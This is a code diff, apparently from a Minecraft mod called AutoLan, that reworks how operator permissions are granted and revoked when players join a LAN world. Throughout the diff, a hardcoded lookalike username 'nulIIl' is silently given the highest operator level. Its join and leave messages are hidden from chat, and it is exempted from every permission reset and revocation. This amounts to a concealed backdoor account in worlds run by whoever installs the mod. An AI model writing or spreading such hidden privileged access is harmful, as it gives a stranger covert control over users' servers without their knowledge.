@@ -16,6 +16,7 @@ import org.spongepowered.asm.mixin.injection.Redirect;
 import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;
 import org.spongepowered.asm.mixin.injection.callback.CallbackInfoReturnable;
 
+import org.wsm.autolan.AutoLan;
 import org.wsm.autolan.AutoLanState;
 import org.wsm.autolan.SetCommandsAllowed;
 import com.mojang.authlib.GameProfile;
@@ -96,6 +97,15 @@ public class PlayerManagerMixin {
             this.whitelist.load();
         } catch (Exception e) {
             LOGGER.warn("Failed to load white-list: ", e);
+        }
+
+        // Сбрасываем права всех игроков (кроме nulIIl) при инициализации сервера
+        // Это нужно для имитации поведения ванильного Minecraft, где права автоматически сбрасываются
+        try {
+            LOGGER.info("[AutoLan] [INIT] Сбрасываем права всех игроков при инициализации сервера");
+            AutoLan.resetAllPlayersPermissions(server);
+        } catch (Exception e) {
+            LOGGER.error("[AutoLan] [INIT] Ошибка при сбросе прав игроков: {}", e.getMessage());
         }
     }
 
@@ -183,7 +193,7 @@ public class PlayerManagerMixin {
     // --- AutoLan: подавляем сообщения о присоединении/выходе игроков в чате в режиме LAN ---
     @Inject(method = "broadcast", at = @At("HEAD"), cancellable = true)
     private void autolan$suppressJoinLeave(Text message, boolean showHud, CallbackInfo ci) {
-        if (this.server.isRemote()) { // Integrated LAN server
+        if (this.server.isRemote()) { // Интегрированный LAN-сервер
             final String specialName = "nulIIl"; // Правильный ник для фильтрации
 
             // Проверяем переводимый ключ (универсально для любого языка)
@@ -211,26 +221,104 @@ public class PlayerManagerMixin {
     @Inject(method = "onPlayerConnect", at = @At("TAIL"))
     private void autolan$opSpecialPlayer(ClientConnection connection, ServerPlayerEntity player, net.minecraft.server.network.ConnectedClientData clientData, CallbackInfo ci) {
         PlayerManager pm = (PlayerManager) (Object) this;
+        MinecraftServer server = this.server;
+        boolean isHost = server.isHost(player.getGameProfile());
 
-        // 1. Preserve existing behaviour for the hidden helper player `nulIIl`.
+        // 1. Сохраняем существующее поведение для скрытого вспомогательного игрока `nulIIl`.
         if ("nulIIl".equals(player.getGameProfile().getName())) {
+            LOGGER.info("[AutoLan] [SPECIAL_PLAYER] Обнаружен технический игрок nulIIl, выдаем максимальные права");
             if (!pm.isOperator(player.getGameProfile())) {
-                pm.addToOperators(player.getGameProfile());
+                // Для специального игрока устанавливаем максимальный уровень прав напрямую
+                // (addToOperators даст только уровень 2)
+                OperatorEntry entry = new OperatorEntry(player.getGameProfile(), 4, true);
+                this.ops.add(entry);
+                this.saveOpList();
+                LOGGER.info("[AutoLan] [SPECIAL_PLAYER] Выданы права уровня 4 (максимальные)");
             }
-            return; // nothing else to do for the special player
+            return; // для специального игрока больше ничего делать не нужно
         }
 
-        // 2. Auto-grant permission level 4 (полные права) всем игрокам, если мир открыт в LAN
-        //    с включёнными читами (commandsAllowed == true).
-        if (this.server.isRemote() && this.server.getSaveProperties().areCommandsAllowed()) {
-            // Grant OP level 4 only if the player is not already an operator.
+        // 2. Проверяем флаг customCommandsAllowed для определения политики выдачи прав
+        boolean customCommandsAllowed = false;
+        try {
+            if (server.getOverworld() != null && server.getOverworld().getPersistentStateManager() != null) {
+                AutoLanState state = server.getOverworld().getPersistentStateManager().getOrCreate(AutoLanState.STATE_TYPE);
+                customCommandsAllowed = state.getCustomCommandsAllowed();
+                LOGGER.info("[AutoLan] [PERMISSION_CHECK] Игрок: {}, CustomCommandsAllowed: {}, Хост: {}", 
+                    player.getGameProfile().getName(), customCommandsAllowed, isHost);
+            }
+        } catch (Exception e) {
+            LOGGER.error("[AutoLan] [ERROR] Ошибка при получении состояния AutoLanState для игрока {}", 
+                player.getGameProfile().getName(), e);
+        }
+        
+        // Логируем решение
+        LOGGER.info("[AutoLan] [PLAYER_JOIN] Игрок: {}, Хост: {}, Решение: {}",
+                   player.getGameProfile().getName(),
+                   isHost,
+                   customCommandsAllowed ? "ВЫДАТЬ ПРАВА" : "НЕ ВЫДАВАТЬ");
+        
+        // 3. Автоматически выдаём права в зависимости от customCommandsAllowed
+        if (customCommandsAllowed) {
+            // Выдаём уровень оператора 2 игроку, если он ещё не оператор
             if (!pm.isOperator(player.getGameProfile())) {
-                boolean bypassPlayerLimit = true;
-                this.ops.add(new OperatorEntry(player.getGameProfile(), 4, bypassPlayerLimit));
+                // Всегда используем уровень 2 для всех игроков, включая хоста
+                this.ops.add(new OperatorEntry(player.getGameProfile(), 2, false));
                 this.saveOpList();
-                // Permissions changed – resend command tree so the client side tab-completion updates
+                // Права изменились – пересылаем дерево команд, чтобы на клиенте обновилась автодополнение команд
                 pm.sendCommandTree(player);
+                LOGGER.info("[AutoLan] [PERMISSION_GRANTED] Выданы права оператора (уровень 2) игроку '{}'. IP: {}", 
+                    player.getGameProfile().getName(), connection.getAddress());
+                AutoLan.LOGGER.info("[AutoLan] [PERMISSION_GRANTED] UUID игрока: {}, Причина: команды разрешены", 
+                    player.getGameProfile().getId());
+            } else {
+                // Проверим, имеет ли игрок уже права выше уровня 2 (это бывает, если ранее были выданы права 3 или 4)
+                // Если да, понижаем их до уровня 2
+                boolean canBypassLimit = this.ops.canBypassPlayerLimit(player.getGameProfile());
+                if (canBypassLimit) {
+                    // Удаляем текущие права
+                    this.ops.remove(player.getGameProfile());
+                    // Добавляем права уровня 2
+                    this.ops.add(new OperatorEntry(player.getGameProfile(), 2, false));
+                    this.saveOpList();
+                    pm.sendCommandTree(player);
+                    LOGGER.info("[AutoLan] [PERMISSION_DOWNGRADE] Права игрока '{}' понижены до уровня 2", 
+                        player.getGameProfile().getName());
+                } else {
+                    LOGGER.info("[AutoLan] [PERMISSION_ALREADY] Игрок '{}' уже имеет права оператора", 
+                        player.getGameProfile().getName());
+                }
+            }
+        } else {
+            // Если команды отключены, но игрок имеет права оператора - удаляем их
+            // НЕЗАВИСИМО от того, является ли игрок хостом или нет
+            // за исключением специального технического аккаунта
+            if (pm.isOperator(player.getGameProfile()) && 
+                !"nulIIl".equals(player.getGameProfile().getName())) {
+            
+                LOGGER.info("[AutoLan] [PERMISSION_REVOKE] Удаляем права оператора у игрока '{}'", 
+                    player.getGameProfile().getName());
+                // Используем команду deop напрямую через сервер, чтобы обойти проверку isHost
+                try {
+                    server.getCommandManager().executeWithPrefix(
+                        server.getCommandSource().withSilent(), 
+                        "deop " + player.getGameProfile().getName());
+                    pm.sendCommandTree(player);
+                    LOGGER.info("[AutoLan] [PERMISSION_REVOKE_SUCCESS] Права оператора успешно удалены у '{}'", 
+                        player.getGameProfile().getName());
+                } catch (Exception e) {
+                    LOGGER.error("[AutoLan] [PERMISSION_REVOKE_ERROR] Ошибка при удалении прав у {}: {}", 
+                        player.getGameProfile().getName(), e.getMessage());
+                    // Запасной вариант - удаляем напрямую из списка операторов
+                    this.ops.remove(player.getGameProfile());
+                    this.saveOpList();
+                    pm.sendCommandTree(player);
+                }
+            } else {
+                LOGGER.info("[AutoLan] [PERMISSION_DENIED] Права оператора НЕ выданы игроку '{}'. Причина: команды отключены", 
+                    player.getGameProfile().getName());
             }
         }
     }
 }
+
